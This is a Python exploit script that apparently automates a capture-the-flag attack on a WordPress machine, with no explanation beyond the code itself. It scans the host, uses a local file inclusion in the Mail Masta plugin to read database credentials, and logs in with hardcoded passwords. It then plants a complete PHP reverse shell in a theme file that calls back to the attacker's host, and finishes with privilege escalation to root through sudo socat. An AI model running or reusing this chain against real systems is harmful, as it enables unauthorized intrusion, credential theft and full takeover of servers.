import subprocess
import requests
import sys
import base64
import re
import socket
import threading
import time


RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = '\033[93m'

def create_payload(HOST_IP, PORT):
    return f'''<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '{HOST_IP}';  // CHANGE THIS
$port = {PORT};  // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {{
    $pid = pcntl_fork();
    if ($pid == -1) {{
        printit("ERROR: Can't fork");
        exit(1);
    }}
    if ($pid) {{
        exit(0);  
    }}
    if (posix_setsid() == -1) {{
        printit("Error: Can't setsid()");
        exit(1);
    }}
    $daemon = 1;
}} else {{
    printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    printit("$errstr ($errno)");
    exit(1);
}}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {{
    printit("ERROR: Can't spawn shell");
    exit(1);
}}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {{
    if (feof($sock)) {{
        printit("ERROR: Shell connection terminated");
        break;
    }}
    if (feof($pipes[1])) {{
        printit("ERROR: Shell process terminated");
        break;
    }}
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {{
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }}
    if (in_array($pipes[1], $read_a)) {{
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }}
    if (in_array($pipes[2], $read_a)) {{
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }}
}}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {{
    if (!$daemon) {{
        print "$string\\n";
    }}
}}

?>'''



def nmap_scan(IP):
    print(f"{RED}[+] Scanning with nmap......{RESET}")
    try:
        result = subprocess.run(["nmap", "-sCV", "-Pn", "-T5", "-p", "21,22,80", IP], check=True, text=True, capture_output=True)
        print(result.stdout)
        print(f"{GREEN}[+] Scan completed successfully.{RESET}")
    except subprocess.CalledProcessError as e:
        print(e.stderr)
        print(f"{RED}[-] Scan failed with exit code {e.returncode}.{RESET}")
        sys.exit(1)

def wordpress_scan(url):
    print(f"{RED}[+] Running wpscan on target{RESET}")
    try: 
        wpscan = subprocess.run(["wpscan", "--disable-tls-checks", "--url", url, "--no-update"], check=True, text=True, capture_output=True)
        print(wpscan.stdout)
        print(f"{GREEN}[+] Wordpress scan completed")
    except subprocess.CalledProcessError as e:
        print(e.stderr)
        print(f"{RED}[-] Wordpress scan failed with exit code {e.returncode}.{RESET}")
        sys.exit(1)

def mail_mastsa_checker(IP):
    mail_mastsa_url = f'http://{IP}/wordpress/wp-content/plugins/mail-masta/'
    try:
        mail_mastsa_response = requests.get(mail_mastsa_url)
        if mail_mastsa_response.status_code == 200:
            print(f"{GREEN}[+] Mail masta plugin Running correctly{RESET}")
        else:
            print(f"[-] Error occurred ")
            sys.exit(1)
    except requests.RequestException as e:
        print(f"{RED}[-] Error checking Mail Masta plugin: {e}{RESET}")
        sys.exit(1)

def finding_creds(IP):
    print(f'[+]{RED}Attempting to read the config file of WordPress{RESET}')
    # Local file inclusion in mail masta version 1.0
    local_file_inclusion = f'http://{IP}/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php'
    try:
        local_file_inclusion_response = requests.get(local_file_inclusion)
        base64encoded = local_file_inclusion_response.text
        base64decoded = base64.b64decode(base64encoded).decode('utf-8')
        print(base64decoded)
        print(f'{RED}[+] Attempting to print name and password in the config{RESET}')
        db_name_match = re.search(r"define\s*\(\s*'DB_USER'\s*,\s*'([^']*)'\s*\)\s*;", base64decoded)
        db_password_match = re.search(r"define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\)\s*;", base64decoded)
        print(f'{db_name_match}')
        print(f'{db_password_match}')
    except requests.RequestException as e:
        print(f"{RED}[-] Error finding credentials: {e}{RESET}")
        sys.exit(1)

def authentication(IP, session):
    print(f'{RED}[+] Attempting to authenticate with creds{RESET}')
    login_url = f'http://{IP}/wordpress/wp-login.php'
    admin_url = f'http://{IP}/wordpress/wp-admin/theme-editor.php'

    header = {
        'Host': f'{IP}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': f'http://{IP}',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }

    body = {
        'log': 'elyana',
        'pwd': 'H@ckme@123',
        'wp-submit': 'Log In',
        'testcookie': '1'
    }

    try:
        auth = session.post(login_url, headers=header, data=body)
        auth_header = auth.headers.get('Set-Cookie', '')
        if 'wordpress_logged_in' in auth_header:
            print(f'{GREEN}[+] Authentication successful as user *elyana* !{RESET}')
        else:
            print(f'{RED}[-] Authentication failed! Check username and password{RESET}')
            sys.exit(1)
    except requests.RequestException as e:
        print(f"{RED}[-] Error authenticating: {e}{RESET}")
        sys.exit(1)

def finding_nonce(IP, session):
    print(f'{RED}[+] Checking what is the nonce...{RESET}')
    nonce_check_url = f'http://{IP}/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty'
    try:
        nonce_text = session.get(nonce_check_url).text
        search_string = 'id="nonce" name="nonce" value="'
        search_string_end = '"'
        nonce_text = nonce_text[nonce_text.find(search_string) + len(search_string):]
        wp_nonce = nonce_text[:nonce_text.find(search_string_end)]
        print(f'{GREEN}[+] The nonce is {wp_nonce}{RESET}')
        return wp_nonce
    except requests.RequestException as e:
        print(f"{RED}[-] Error finding nonce: {e}{RESET}")
        sys.exit(1)
        return wp_nonce

def uploading_reverse_shell(IP, wp_nonce, session):
    payload_header = {
        'Host': f'{IP}',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': f'http://{IP}/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': f'http://{IP}',
        'Connection': 'close',
    }
    update_payload = {
        'action': 'edit-theme-plugin-file',
        'file': '404.php',
        'theme': 'twentytwenty',
        'newcontent': PAYLOAD,
        'nonce': wp_nonce,
        '_wp_http_referer': '/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty',
        'docs-lis': '',
    }

    print(f'{RED}[+] Attempting to change the 404.php of the twentytwenty theme to PHP reverse shell{RESET}')
    ajax_url = f'http://{IP}/wordpress/wp-admin/admin-ajax.php'
    try:
        response = session.post(ajax_url, headers=payload_header, data=update_payload)
        print(f'{RED}[+] Request Details{RESET}')
        print(f'URL: {ajax_url}')
        print(f'Headers: {response.request.headers}')
        print(f'Cookies: {session.cookies.get_dict()}')
        print(f'Payload: {update_payload}')
        print(response)
        response_text = response.text
        print(f"{GREEN}Response Text: {response_text}{RESET}")
        if response.status_code == 200:
            print(f"{GREEN}[+] Reverse shell uploaded successfully{RESET}")
        else:
            print(f"{RED}Failed to update file: {response.status_code} - {response.text}{RESET}")
            sys.exit(1)
    except requests.RequestException as e:
        print(f"{RED}[-] Error uploading reverse shell: {e}{RESET}")
        sys.exit(1)


def trigger_reverse_shell(IP):
    shell_url = f'http://{IP}/wordpress/wp-content/themes/twentytwenty/404.php'
    print(f"{YELLOW}[+] Triggering reverse shell at {shell_url}{RESET}")
    try:
        subprocess.Popen(["curl", shell_url], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"{GREEN}[+] Reverse shell triggered successfully!{RESET}")
    except Exception as e:
        print(f"{RED}[-] Failed to trigger reverse shell: {e}{RESET}")



def start_listener(HOST_IP, PORT):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind((HOST_IP, int(PORT)))
    listener.listen(1)
    print(f"{GREEN}[+] Listener started on {HOST_IP} port {PORT}{RESET}")
    return listener

def handle_client(client_socket):
    commands = [
        'cat /etc/mysql/conf.d/private.txt',
        'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
        'su elyana',
        'E@syR18ght',
        'cat /home/elyana/user.txt',
        'sudo -l',
        'sudo socat stdin exec:/bin/sh',
        'cat /root/root.txt'
    ]

    user_flag = ''
    root_flag = ''

    try:
        for i, command in enumerate(commands):
            print(f"Sending command: {command}")
            client_socket.sendall(command.encode() + b'\n')
            time.sleep(0.5)
            response = b''
            while True:
                part = client_socket.recv(4096)
                response += part
                if len(part) < 4096:
                    break
            response_text = response.decode()
            output_lines = response_text.split('\n')
            output = "\n".join(output_lines[1:]).strip()

            print(f"Response for command '{command}':")
            print(output)

            if i == 4:  
                user_flag = output

                print(f'User flag: {user_flag}')
            if i == 7:  
                root_flag = output
                print(f'Root flag: {root_flag}')
    except Exception as e:
        print(f"[-] Error handling client: {e}")

    return user_flag, root_flag


def finding_flags(listener):
    try:
        print(f"{RED}[+] Waiting for a connection...{RESET}")
        client_socket, client_address = listener.accept()
        print(f"{GREEN}[+] Connection established with {client_address}{RESET}")
        user_flag, root_flag = handle_client(client_socket)
        
        if user_flag:
            print(f'{YELLOW} [++++] User flag: {user_flag}{RESET}')
        if root_flag:
            print(f'{YELLOW} [++++] Root flag: {root_flag}{RESET}')
        
    except Exception as e:
        print(f"{RED}[-] Error accepting connection: {e}{RESET}")
    finally:
        listener.close()
def close_listener(listener):
    listener.close()
    print(f"{GREEN}[+] Listener closed.")


if __name__ == "__main__":  
    IP = input(f"Input target IP: ")

    HOST_IP = input(f"Input your IP: ")

    PORT = input(f"Input desired port to listen: ")

    PAYLOAD = create_payload(HOST_IP,PORT)

    #Enumerating The Target
    nmap_scan(IP)
    
    url = f"http://{IP}/wordpress"
    response = requests.get(url)
    if response.status_code == 200:
        print(f"{GREEN}[+] Wordpress Running correctly")
    else:
        print(f"{RED}[-] Error occured{RESET}")
        sys.exit(1)
    wordpress_scan(url)

    #Exploiting The Target/Foothold
    mail_mastsa_checker(IP)
    finding_creds(IP)
    session = requests.Session()
    authentication(IP, session)
    wp_nonce = finding_nonce(IP,session)
    uploading_reverse_shell(IP, wp_nonce, session)
    time.sleep(1)
    
    #Privilege escalation
    listener = start_listener(HOST_IP, PORT)
    trigger_reverse_shell(IP)
    finding_flags(listener)
    close_listener(listener)








